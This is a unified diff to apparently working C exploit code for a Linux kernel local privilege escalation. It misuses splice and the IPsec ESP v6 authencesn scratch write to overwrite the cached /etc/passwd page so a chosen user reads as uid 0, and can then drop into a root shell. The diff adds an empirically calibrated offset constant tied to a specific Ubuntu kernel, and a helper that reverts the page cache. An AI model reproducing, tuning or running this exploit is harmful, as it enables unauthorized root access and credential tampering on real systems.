@@ -53,6 +53,21 @@ extern ssize_t vmsplice(int fd, const struct iovec *iov, unsigned long nr,
  * SPI(4)+seq(4)+IV(16)+target(16)+pad = 40+pad. Pad to 48 bytes. */
 #define V6_PAD_BYTES 8
 
+/* Empirical STORE-offset shift between v4 and v6 paths.
+ *
+ * In v4, the authencesn scratch-write at dst[assoclen+cryptlen]=dst[24]
+ * lands at file_offset == splice_off (we proved this end-to-end on Ubuntu
+ * 24.04, kernel 6.8.0-111). In v6, with our [hdr(24)][passwd(16)][pad(8)]
+ * wire layout, the STORE empirically lands at splice_off + 9. The exact
+ * source of the +9 isn't fully understood (likely a frag-vs-linear
+ * accounting wrinkle in esp6_input's skb_to_sgvec), but it is consistent
+ * across runs at this kernel revision.
+ *
+ * We compensate by splicing from passwd_off - V6_STORE_SHIFT, so the
+ * STORE lands at the intended target offset. Re-test on different kernel
+ * versions; this constant may need recalibration. */
+#define V6_STORE_SHIFT  9
+
 /* ---------------------------------------------------------------- *
  * Detection
  * ---------------------------------------------------------------- */
@@ -296,7 +311,14 @@ static bool trigger_store_v6(off_t passwd_off)
         goto fail;
     }
     {
-        loff_t off = passwd_off;
+        /* Compensate for the empirical +9 STORE-offset shift in v6 by
+         * splicing from passwd_off - V6_STORE_SHIFT. The 16-byte splice
+         * still lives entirely on the same page-cache page (page 0 of
+         * /etc/passwd), so the kernel's frag points at the correct page;
+         * the STORE then lands at the intended file offset (uid_off). */
+        loff_t off = (passwd_off >= V6_STORE_SHIFT)
+                     ? passwd_off - V6_STORE_SHIFT
+                     : 0;
         if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
             log_bad("splice passwd: %s", strerror(errno));
             goto fail;
@@ -463,10 +485,10 @@ df_result_t dirtyfrag_esp6_exploit(bool do_shell)
     log_ok("page cache now reports %s with uid 0 (via v6 path)", user);
 
     if (!do_shell) {
-#ifdef POSIX_FADV_DONTNEED
-        int e = open("/etc/passwd", O_RDONLY);
-        if (e >= 0) { posix_fadvise(e, 0, 0, POSIX_FADV_DONTNEED); close(e); }
-#endif
+        if (try_revert_passwd_page_cache())
+            log_ok("page cache reverted (--no-shell)");
+        else
+            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
         return DF_EXPLOIT_OK;
     }
 
